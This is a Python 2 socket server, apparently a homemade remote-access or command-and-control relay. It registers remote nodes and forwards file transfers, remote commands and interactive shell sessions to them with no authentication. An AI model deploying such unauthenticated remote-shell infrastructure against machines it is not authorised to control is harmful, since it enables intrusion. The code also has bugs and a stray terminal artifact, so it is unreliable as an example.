#!/usr/bin/env python
import ast
import json
import time
import subprocess
import struct
import os
import sys
import os.path
import socket
from thread import *
# Create & Bind socket
print """
       _       _        _   _      _        _____
      | |     | |      | \ | |    | |      / ____|
      | | __ _| | _____|  \| | ___| |_    | (___   ___ _ ____   _____ _ __
  _   | |/ _` | |/ / _ \ . ` |/ _ \ __|    \___ \ / _ \ '__\ \ / / _ \ '__|
 | |__| | (_| |   <  __/ |\  |  __/ |_     ____) |  __/ |   \ V /  __/ |
  \____/ \__,_|_|\_\___|_| \_|\___|\__|   |_____/ \___|_|    \_/ \___|_|


"""
bind_ip = "0.0.0.0"
bind_port = 9998
registereduids={}

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server.bind((bind_ip,bind_port))
server.listen(10)
print "[*] Listening on %s:%d" % (bind_ip, bind_port)

def sendmsg(conn, msg):
  # 4 byte struct prefix for len(msg)
  msg = struct.pack('>I', len(msg)) + msg
  conn.sendall(msg)

def recvmsg(conn):
  raw_msglen = recvall(conn, 4)
  if not raw_msglen:
    return None
  #unpack struct to integer
  msglen = struct.unpack('>I', raw_msglen)[0]
  return recvall(conn,msglen)


def recvall(conn, n):
  data = ''
  while len(data) < n:
    packet = conn.recv(n - len(data))
    if not packet:
      return None
    data += packet
  return data

def control_handler(conn, request):
  if request["method"] == "idle":
    print "jep"

def init_msg(method,uid,host,location,data,cmd,role):
  request={}
  request["method"]=method
  request["uuid"]=uid
  request["host"]=host
  request["location"]=location
  request["data"]=data
  request["cmd"]=cmd
  request["role"]=role
  msg=json.dumps(request)
  return msg

def init_connect(conn, method,uid,host,location,data,cmd,role):
  print "\t\t[+] Connection: %s" % conn
  try:
    msg=init_msg("ack init",uid,host,"","","","master")
    sendmsg(conn, msg)
    return True
  except:
      print "[FAIL] Failed to init"
      return False

def registeruid(uid,conn,host):
  uid=str(uid)
  host=str(host)
  if len(registereduids) != 0:
    for i in registereduids:
      if i[0] == host:
        old_uid=i[1]
        del registereduids[(i[0],old_uid)]
        registereduids[(i[0],uid)]=conn
        print "[+] Updated registration for host: %s" % host
      else:
        registereduids[(host,uid)]=conn
        print "[+] New registration:\n\t\tHost: %s\n\t\tUUID %s\n\t\t%s" % (host,uid,conn)
  else:
    registereduids[(host,uid)]=conn
    print "[+] New registration:\n\t\tHost: %s\n\t\tUUID %s\n\t\t%s" % (host,uid,conn)
  return True

def file_handler(conn,method,uid,host,location,data,cmd,role):
  nodeconn=registereduids[(host,uid)]
  nodemsg=init_msg(method,uid,host,location,data,cmd,role)
  try:
    sendmsg(nodeconn, nodemsg)
  except:
    print "[FAIL] Failed to send request to remote node"
  try:
    output=recvmsg(nodeconn)
    msg=init_msg("ack files",uid,host,location,data,cmd,"master")
    sendmsg(nodeconn,msg)
  except:
    print "File Handler crashed!"
  try:
    outmsg=init_msg(method,uid,host,location,output,cmd,role)
    sendmsg(conn, outmsg)
    print "[+] Output sent to jnodeclient"
  except:
    print "[FAIL] Failed to send output to jnodeclient"

def request_handler(conn,addr):
  request=recvmsg(conn)
  request=json.loads(request)
  print "[*] Request Handler Started for %s" % conn
#  print "[+] UUID: %s" % request["uuid"]
#  print "[+] Host: %s" % request["host"]
#  print "[+] Method: %s" % request["method"]
#  print "[+] Location: %s" % request["location"]
#  print "[+] Data: %s" % request["data"]
#  print "[+] Command: %s" % request["cmd"]
#  print "[+] Role: %s" % request["role"]
  method=request["method"]
  uid=request["uuid"]
  uid=str(uid)
  host=request["host"]
  location=request["location"]
  data=request["data"]
  cmd=request["cmd"]
  role=request["role"]
  if method == "download":
    file_handler(conn,method,uid,host,location,data,cmd,role)
  if method == "upload":
    file_handler(conn,method,uid,host,location,data,cmd,role)
  if method == "uuids":
    uidlist=[]
    for i in registereduids:
      reghost=i[0]
      reguid=i[1]
      msg=reghost+": "+reguid
      uidlist.append(msg)
      uidmsg=init_msg(method,uid,host,"",uidlist,cmd,role)
      try:
        sendmsg(conn,uidmsg)
      except:
        print "FAILED TO SEND UIDLIST"
  if method == "ack_up":
    print "[+] Upload complete"                                                                                                                                                                                                     [54/9645]
    ackup=init_msg(method,uid,host,location,data,cmd,role)
    sendmsg(conn,ackup)
  if method == "ack_conn":
    print "[+] Node %s ACK'ed ready state with UUID: %s" % (host,uid)
  if method == "shell":
    print "[+] Processing shell request..."
    try:
      sendmsg(conn,"shellack")
      nodeconn=registereduids[(host,uid)]
      nodemsg=init_msg(method,uid,host,location,data,cmd,role)
      sendmsg(nodeconn,nodemsg)
    except:
      print "[FAIL] Failed to send shell init to node"
    try:
      print "[+] Getting ACK for shell"
      ack=recvmsg(nodeconn)
    except:
      print "[FAIL] Failed to receive shell ack from node"
    if ack == "shellack":
      print "[+] Shell was ACK'ed!"
      while True:
        try:
          print "[+] Awaiting command from client..."
          data=recvmsg(conn)
        except:
          print "[FAIL] Failed to receive command from client..."
        if data == "quit":
          nodecmd=sendmsg(nodeconn, data)
          recvmsg(nodeconn)
          break
        try:
          print "[+] Sending command %s to nodeconn" % data
          nodecmd=sendmsg(nodeconn, data)
          print "[+] Command sent."
        except:
          print "[FAIL] Failed to send command"
        try:
          print "[+] Awaiting output from nodeconn"
          nodeans=recvmsg(nodeconn)
          print "[+] Output received"
        except:
          print "[FAIL] Failed to receive command output from nodeconn"
        try:
          print "[+] Sending output to client"
          clientans=sendmsg(conn,nodeans)
          print "[+] Output sent"
        except:
          print "[FAIL] Failed to send output to client"
    else:
      print "SHELL Not acked!"
  if method == "init":
    try:
      registeruid(uid,conn,host)
    except:
      print "Register failed"
    #if uid == str(uidlist[host]):
    try:
      print "[+] Initializing"
      if init_connect(conn,method,uid,host,location,data,cmd,role):
        print "\t\t[+] Initialization completed for %s:%d" % (addr[0], addr[1])
      else:
        print "\t\t[+] Initialization failed!"
    except:
      print "[FAIL] Attempt failed"
    try:
      initack=recvmsg(conn)
    except:
      print "Failed to receive init ack ack"
  if role == "master":
#    for i in registereduids:
#      if i[1] == uid:
#        print "[+] Registered host detected"
#        print "\t\t[+] Registered Connection  : %s" % i[1]
#        print "\t\t[+] Requested  UUID        : %s" % uid
#      else:
#        msg= "[FAIL] UUID: %s not found." % uid
#        sendmsg(conn, msg)
    if method == "remcmd":
      nodeconn=registereduids[(host,uid)]
      print "[+] Remote command process launching...."
      print "\t\t[+] RemCMD ADDR            : %s:%d" % (addr[0],addr[1])
      print "\t\t[+] Target UUID            : %s" % uid
      print "\t\t[+] Command                : %s" % request["cmd"]
      print "\t\t[+] Method                 : %s" % request["method"]
      print "\t\t[+] Src    Connection      : %s" % conn
      print "\t\t[+] Dest   Connection      : %s" % nodeconn
      try:
        nodemsg=init_msg(method,uid,host,"","",cmd,role)
      except:
        print "[FAIL] Failed to init response message"
      #sendmsg(conn, nodemsg)
      try:
        sendmsg(nodeconn, nodemsg)
      except:
        print "[FAIL] Failed to send request to remote node"
      try:
        output=recvmsg(nodeconn)
#        msg=init_msg("ack remcmd",uid,host,"","","","master")
#        sendmsg(nodeconn,msg)
      except:
        print "[FAIL] Failed to receive output from remote node"
      try:
        outmsg=init_msg(method,uid,host,location,output,cmd,role)
        sendmsg(conn, outmsg)
        print "[+] Output sent to jnodeclient"
      except:
        print "[FAIL] Failed to send output to jnodeclient"

while True:
  print '\n[SERVER] Server Loop\n'
  client,addr = server.accept()
  start_new_thread(request_handler,(client,addr))

server.close()
